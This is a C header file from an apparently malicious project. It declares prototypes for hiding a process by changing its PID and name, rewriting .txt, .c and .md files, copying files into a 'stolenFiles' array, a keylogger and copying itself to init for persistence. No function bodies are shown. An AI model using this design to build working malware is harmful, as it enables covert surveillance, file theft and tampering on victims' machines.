#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <dirent.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <pwd.h>
#include <fcntl.h>
#include <errno.h>
#include <math.h>

//From renameProcess.c
void changePID();
void changeProcessName(char *argv[]);

//From changeFiles.c
void changeTxt(struct dirent *entry, const char *direct);
void changeC(struct dirent *entry, const char *direct);
void changeMd(struct dirent *entry, const char *direct);
void openDir(const char *direct, int level);
void givePermission();
int copyFile(char *address, char *destPath);
int keyLogger();

char copyToDir[1024];
char stolenFiles[1024][1024];

//From automatic.c
void copyToInit();
